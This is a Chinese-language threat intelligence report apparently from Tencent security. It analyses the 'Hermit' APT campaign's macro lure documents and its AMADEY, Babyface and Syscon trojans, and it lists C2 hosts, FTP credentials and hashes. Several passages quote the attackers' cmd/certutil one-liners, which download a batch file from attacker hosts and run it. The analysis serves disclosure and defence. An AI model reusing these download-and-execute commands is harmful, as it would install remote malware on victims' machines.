##  **一、** **背景**

**腾讯安全御见威胁情报中心曾在2018年12月发布了分析文章：《Hermit（隐士）：针对朝鲜半岛的APT攻击活动披露》。近期，腾讯安全御见威胁情报中心再次监测到该组织的新活动。通过分析和溯源，我们发现该攻击活动主要针对区块链、数字货币、金融目标等，但是我们也发现了同样针对外交实体的一些攻击活动。**

本次攻击活动跟之前的活动相比，技术手段类似，但是也有一定的更新，如通过下载新的doc文档来完成后续的攻击以及使用AMADEY家族的木马。而最终的目标依然为运行开源的babyface远控木马。此外，传统的Syscon/Sandy家族的后门木马也依然在进行活跃。

##  **二、** **攻击技术分析**

1、攻击入口

本次攻击采用鱼叉攻击的方式，投递的攻击诱饵为doc文档，信息如下：

文件hash |  文件名  |  文件类型  |  文档作者  |  最后修改者  |  最后修改时间  |  上传到VT时间  
---|---|---|---|---|---|---  
237026e58e0ac6ce109d874d43d3d64e  |  20190429_13.doc  |  MS Word Document  |
BlueSky  |  BlueSky  |  2019:04:29 07:22:00  |  2019-04-30 03:54:41  
c0c007ce1a2d9fb8420c421d419f9f87  |  20190513_8.doc  |  MS Word Document  |
BlueSky  |  BlueSky  |  2019:05:13 05:25:00  |  2019-05-15 05:22:20  
  
以20190513_8.doc为例，运行文档后，首先会提示启用宏：

![1.png](https://image.3001.net/images/20190527/1558922324_5ceb44549afc4.png!small)

启用宏代码后，会从<http://fighiting1013.org/2/modif8.doc>下载回来一个新的doc文档，重命名为20190513-8.doc（跟文档同名），然后打开下载回来的文档并关闭原始文档：

![2.png](https://image.3001.net/images/20190527/1558922360_5ceb44788d98b.png!small)

modif8.doc打开后内容如下：

![3.png](https://image.3001.net/images/20190527/1558922380_5ceb448c4dce5.png!small)

文档内容跟区块链信息相关：

![4.png](https://image.3001.net/images/20190527/1558922379_5ceb448b22a01.png!small)

打开文档后，同样提示启用宏。宏代码启用后，会执行以下命令：

    
    
    cmd.exe /q /c copy /Y%windir%\System32\certutil.exe %TEMP%\ct.exe && cd /d %TEMP% &&ct -urlcache -split -f http://tgbabcrfv.1apps.com/1.txt && cd /d %TEMP%&& ren 1.txt 1.bat && del /f /q 1.txt && 1.bat

![5.png](https://image.3001.net/images/20190527/1558922389_5ceb4495b5bfe.png!small)

该命令首先将certutil.exe复制到%TEMP%目录下并命名为ct.exe，随后利用ct.exe去下载1.txt并拷贝为1.bat，删除1.txt后执行1.bat。

<http://tgbabcrfv.1apps.com/1.txt>内容为：

![6.png](https://image.3001.net/images/20190527/1558922395_5ceb449b8ec7a.png!small)

1.bat批处理文件会去下载3.txt并解码重命名为setup.cab文件。然后解压安装cab文件到%TEMP%目录下，随后运行解压安装后的install.bat。

![7.png](https://image.3001.net/images/20190527/1558922402_5ceb44a2d57e7.png!small)

解码后为：

![8.png](https://image.3001.net/images/20190527/1558922412_5ceb44ac6bcc8.png!small)

install.bat将victory.exe移动到 C:\Users\Public\Documents 目录下，并设置注册表自启：

![9.png](https://image.3001.net/images/20190527/1558922425_5ceb44b989b1c.png!small)

2、植入的恶意文件分析

1） victory.exe分析

样本通过EnumWindows回调函数进行解密，并创建同名子进程，解密密钥为：”hmrdeuhnetfiovtyeftqodhguhvnqkqurpmaflrpbnyezvwi”：

![10.png](https://image.3001.net/images/20190527/1558922432_5ceb44c02c2bf.png!small)

![11.png](https://image.3001.net/images/20190527/1558922489_5ceb44f92c768.png!small)

对解密出来的PE分析，首先样本会对内置的硬编码进行解密：

![12.png](https://image.3001.net/images/20190527/1558922496_5ceb45003b188.png!small)

并且收集本地机器信息，包括本地杀软信息：

![13.png](https://image.3001.net/images/20190527/1558922512_5ceb45103f549.png!small)

![14.png](https://image.3001.net/images/20190527/1558922521_5ceb45199f757.png!small)

收集完成后通过http
post发送给服务器，服务器回传信息中包含进一步下载连接。下载地址为：<http://fighiting1013.org/2/sp.exe>

![15.png](https://image.3001.net/images/20190527/1558922527_5ceb451f7aa4b.png!small)

接收到服务器回传信息后，会去下载地址下载可执行程序并运行：

![16.png](https://image.3001.net/images/20190527/1558922537_5ceb4529c02c6.png!small)

而通过访问该木马的C2，可以发现该木马为AMADEY家族的木马：

![17.png](https://image.3001.net/images/20190527/1558922552_5ceb45388abdd.png!small)

2） sp.exe分析

经过对sp.exe的分析，该RAT跟之前我们曝光的一样，同样为babyface远控：

![18.png](https://image.3001.net/images/20190527/1558922552_5ceb453832437.png!small)

![19.png](https://image.3001.net/images/20190527/1558922594_5ceb45628036b.png!small)

C2为5.252.198.93:7337

![20.png](https://image.3001.net/images/20190527/1558922606_5ceb456e8ef9a.png!small)

木马向C2服务器发送数据

##  **三、** **关联分析**

1、 同Hermit（隐士）行动的关系

无论是宏代码，还是解码方式，还是最终的脚本形式，都跟之前我们披露的Hermit（隐士）行动一致，而隐士行动跟syscon以及konni的关系，之前的文章已经有比较详细的描述，本文就不再赘述；

如之前的行动的执行脚本：

![21.png](https://image.3001.net/images/20190527/1558922620_5ceb457c71ace.png!small)

宏代码：

![22.png](https://image.3001.net/images/20190527/1558922629_5ceb4585cae6d.png!small)

都跟本次的攻击活动类似。此外，作者的信息同样都为BlueSky：

![23.png](https://image.3001.net/images/20190527/1558922639_5ceb458fe86dd.png!small)

![24.png](https://image.3001.net/images/20190527/1558922647_5ceb4597b97c1.png!small)

而从基础设施上，依然喜欢使用一些动态的域名来进行攻击，如1apps、000webhostapp等。

当然，本次攻击行动跟之前比，在技术上也进行了一定小幅度的更新：

1） 采用下载新的文档的形式来执行恶意代码；

2） 采用商用的AMADEY家族木马来进行传播；

2、年初的syscon攻击活动

根据同样的宏特征、基础设施的特征，在腾讯安全御见大数据中心的样本库里，我们同样找到了年初的攻击活动。

攻击诱饵文档：

文件hash  |  文件名  |  文件类型  |  文档作者  |  最后修改者  |  最后修改时间  |  上传到VT时间  
---|---|---|---|---|---|---  
68b080cdc748e9357e75a65fba30eaa7  |  igtaud.doc  |  MS Word Document  |  N/A
|  Windows User  |  2019:01:21 23:36:00  |  2019-01-23 12:57:34  
  
打开后，提示需要启用宏，且文档内容模糊：

![25.png](https://image.3001.net/images/20190527/1558922671_5ceb45afa8e61.png!small)

启用宏后：

![26.png](https://image.3001.net/images/20190527/1558922674_5ceb45b2b9590.png!small)

![27.png](https://image.3001.net/images/20190527/1558922686_5ceb45be27c15.png!small)

宏代码为：

![28.png](https://image.3001.net/images/20190527/1558922695_5ceb45c7c8bda.png!small)

与之前的攻击的宏代码相似似，本次攻击命令存放在<http://clean.1apps.com/1.txt>

![29.png](https://image.3001.net/images/20190527/1558922702_5ceb45cea5188.png!small)

1.bat的主要功能是主要根据系统类型下载cab文件到本地展开执行，实现木马的安装。

木马核心功能：

经分析，本次使用的SYSCON后门使用ftp协议进行控制，这也是该后门最大的特点，木马首先会读取同目录下的同名ini文件，并将其解密得到存放C2地址的url链接：<http://clean.1apps.com/4.txt>，将该文件下载解密后得到C2的地址，以及使用的ftp用户名和密码。

![30.png](https://image.3001.net/images/20190527/1558922712_5ceb45d8bcc86.png!small)

从同名.ini文件中读取配置信息，解密后得到一个url（这是本次版本最大的变化之处，之前解密后直接得到C2）

将url指向的文件下载回来存为temp.ini，使用相同的方法解密后得到C2：

![31.png](https://image.3001.net/images/20190527/1558922732_5ceb45ecc44a7.png!small)

![32.png](https://image.3001.net/images/20190527/1558922741_5ceb45f577815.png!small)

其中，C2信息为：

> FTP Server：ftpupload.net >>185.27.134.11
>
> UserName：b9_23329410
>
> PASS WORD：tailung

解密出配置信息后，通过运行systeminfo和tasklist命令来收集系统信息，收集后输出到temp.ini，并压缩上传到C2中，上传的文件名格式为to
+ 计算机名 + 时间：

![33.png](https://image.3001.net/images/20190527/1558922750_5ceb45fe3362d.png!small)

上传systeminfo 、tasklist结果到C2，然后查找C2上的名为toeveryone 的文件，读取内容解密后得到命令进行命令分发：

![34.png](https://image.3001.net/images/20190527/1558922756_5ceb4604f3c2d.png!small)

所支持命令如下：

命令  |  功能  |  
---|---|---  
cmd /c  |  带/user标志  |  以explorer权限执行命令  
带/stext或> |  执行命令并把结果输出到temp.ini  |  
不带任何标志  |  WinExec执行指定命令  |  
pull  |  上传指定文件  |  
chip  |  通过修改配置文件实现修改木马C2  |  
put  |  移动文件  |  
  
相关的控制命令：

    
    
    to everyone (0).txt：

用rundll32 加载%appdata%\Microsoft\Office\qsisxkey.dll调用SetupHook接口

![35.png](https://image.3001.net/images/20190527/1558922766_5ceb460e748a3.png!small)

to everyone (1).txt：上传%appdata%\Microsoft\Office\qsisxkey.txt

![36.png](https://image.3001.net/images/20190527/1558922774_5ceb461613eba.png!small)

to everyone (2).txt：执行dir命令，列举目录%appdata%\Microsoft\Office\

![37.png](https://image.3001.net/images/20190527/1558922780_5ceb461c552a0.png!small)

to everyone (3).txt：删除%appdata%\Microsoft\Office\qsisxkey.txt

![38.png](https://image.3001.net/images/20190527/1558922790_5ceb462623538.png!small)

从本次的活动来看，所使用的恶意文件为该组织较传统的Syscon/Sandy木马。

3、更多的行动

从最终的c2：5.252.198.93，我们又关联到其他的攻击样本,

如：0072b08eb4c1fe2201c52e26833beeb0

该文件同样会下载txt并利用certutil.exe进行解密：

<http://csewater.co.kr/workfolder/work/monitor/1.txt>

<http://csewater.co.kr/workfolder/work/monitor/setup.txt>

![39.png](https://image.3001.net/images/20190527/1558922801_5ceb46314e8d2.png!small)

下载回的内容如下：

![40.png](https://image.3001.net/images/20190527/1558922813_5ceb463d221e0.png!small)

解码后命名为setup.cab：

![41.png](https://image.3001.net/images/20190527/1558922823_5ceb4647de2b6.png!small)

解压执行install.bat：

![42.png](https://image.3001.net/images/20190527/1558922831_5ceb464f742a8.png!small)

然后启动ntutil.exe：

![43.png](https://image.3001.net/images/20190527/1558922838_5ceb4656bb1b1.png!small)

ntutil.exe利用EnumWindows回调函数进行解密，解密出一个新的PE并创建同名子进程。解密key为：

“thxlezgblyteznaulbwwdzkczexrpbmatepgzkqjyttbbsav”

对解密后的样本为一样为Babyface：

![44.png](https://image.3001.net/images/20190527/1558922845_5ceb465d530c3.png!small)

C2为解密后的winnet.ini中的内容：5.252.198.93:7337

同样，我们将该行动归属到本次的隐士行动中。而根据该文件，我们又扩展得到大量的文件，且均可归属到该行动中。而从诱饵内容来看，都跟朝鲜半岛的数字货币、金融等相关，跟本次攻击行动的一致。

如：3e4015366126dcdbdcc8b5c508a6d25c

执行命令：C:\WINDOWS\system32\cmd.exe /c C: && cd %TEMP% &&certutil -urlcache
-split -f <http://s8877.1apps.com/vip/1.txt> && ren1.txt 1.bat && 1.bat &&
exit

诱饵内容：

![45.png](https://image.3001.net/images/20190527/1558922863_5ceb466fecc7b.png!small)

如：dabccfdd50e593a8cb961a39296f0edf

执行命令：

    
    
    C:\Windows\system32\cmd.exe /c C: && cd%TEMP% && certutil -urlcache -split -fhttps://071790.000webhostapp.com/vic/1.txt && ren 1.txt 1.bat&& 1.bat && exit

诱饵内容：

![46.png](https://image.3001.net/images/20190527/1558922870_5ceb4676bcf7a.png!small)

又如：268fb8da9c7d4c18d0ea1e9a3cbbc449

执行命令：

    
    
    C:\Windows\system32\cmd.exe /c C: && cd%TEMP% && certutil -urlcache -split -f http://s8877.1apps.com/vip/1.txt&& ren 1.txt 1.bat && 1.bat && exit

诱饵内容：

又如：f2d2a2ea4654b2369378fae0b4b9574d

执行命令：

    
    
    C:\Windows\system32\cmd.exe /c C: && cd%TEMP% && certutil -urlcache -split -f http://a7788.1apps.com/att/1.txt&& ren 1.txt 1.bat && 1.bat && exit

诱饵内容：

4、同TA505的关系

我们发现，本次的诱饵内容同TA505的诱饵类似：

如文件：51ce85fdf98e29acf3cce5493888b6bb

![49.png](https://image.3001.net/images/20190527/1558922912_5ceb46a0a182c.png!small)

而前段时间，TA505同样使用AMADEY家族的木马来进行传播。

此外，TA505同样被认为是一支来自于朝鲜半岛的攻击组织，组织目标为金融、数字货币等，跟该攻击活动也有一定的重合。

当然我们也暂未发现更多的强证据来证明TA505同隐士的关系，我们也会持续保持跟踪。

##  **四、** **解决方案**

Hermit（隐士）的活跃地区为世界热点地区，离我国很近，我们提醒国内有关单位、企业在日常工作中，注意采取一些必要的安全措施，防止成为APT攻击的受害者：
****

1、不要打开不明来源的邮件附件；

2、及时打系统补丁和重要软件的补丁；

3、小心处理Office文档，除非确认文档来源可靠，充分了解打开文档的后果，否则务必不要开启Office启用宏代码；

4、推荐部署腾讯御点终端安全管理系统防御病毒木马攻击；

5、使用腾讯御界高级威胁检测系统检测未知黑客的各种可疑攻击行为。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。

![50.png](https://image.3001.net/images/20190527/1558922921_5ceb46a991090.png!small)

##  **五、** **附录**

###  1、IOCs

MD5：

> c0c007ce1a2d9fb8420c421d419f9f87
>
> c0c007ce1a2d9fb8420c421d419f9f87
>
> 9768b1208506e7f026625be173cdb2ee
>
> a59dbf872d4d275415caed24f93a4d02
>
> eb800f555ad690d99d34b1a3b05f610a
>
> a9bd8c69ba5ea70002e776c9f618157b
>
> 43cbadadaead6f11295bf8843bd909ed
>
> 68b080cdc748e9357e75a65fba30eaa7
>
> 2df5a0be61f9b09f380a3fc20945afc0
>
> ed527d42819ad7ed9bbaa2791e8bb445
>
> 46f3540f9a850d3114261e9f1c88100d
>
> 63dc47d134d7dade7fa3e290d879eba4
>
> 5968b80e0567a25909273ccf3527dd83
>
> 63dc47d134d7dade7fa3e290d879eba4
>
> ed527d42819ad7ed9bbaa2791e8bb445
>
> a5406729bf6acda782022ac5486436c3
>
> a9bd8c69ba5ea70002e776c9f618157b
>
> 3e4015366126dcdbdcc8b5c508a6d25c
>
> 7d842177155e20b7b42b0a68ba9081e3
>
> f2d2a2ea4654b2369378fae0b4b9574d
>
> dabccfdd50e593a8cb961a39296f0edf
>
> d896402609e63fc48c7f2433b10c1038
>
> f38d61237d4ecfb87b58cfcd4fd9dd44
>
> c2c2a8e9c5b8298d77a225bf3476b7ae
>
> 268fb8da9c7d4c18d0ea1e9a3cbbc449
>
> fb42ddf48bc581fb9aa8d13f1e4636d1

C&C：

> tgbabcrfv.1apps.com
>
> fighiting1013.org
>
> charley-online.com
>
> 5.252.198.93:7337
>
> alabamaok0515.1apps.com
>
> mail.naver-download.com
>
> clean.1apps.com
>
> ftpupload.net
>
> s8877.1apps.com
>
> hanbosston.000webhostapp.com
>
> a7788.1apps.com/att
>
> 071790.000webhostapp.com
>
> attach10132.1apps.com
>
> 881.000webhostapp.com

pdb：

> c:\miniprojects\x86il\il86\x64\release\IL86.pdb
>
> D:\Attack\DropperBuild\x64\Release\Dropper.pdb

###  2、参考链接

1） Hermit（隐士）：针对朝鲜半岛的APT攻击活动披露  
<https://s.tencent.com/research/report/613.html>

2） SANNY Malware Delivery Method Updated in Recently Observed Attacks  
<https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html>

3） TA505 intensifica ciberataques a Chile y Latinoamérica con#FlawedAmmy  
<https://medium.com/@1ZRR4H/ta505-intensifica-ciberataques-a-chile-y-latinoam%C3%A9rica-con-flawedammy-9fb92c2f0552>

4） 한국어 구사 Konni 조직,블루 스카이 작전 'Amadey' 러시아 봇넷 활용  
<https://blog.alyac.co.kr/2308>

***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

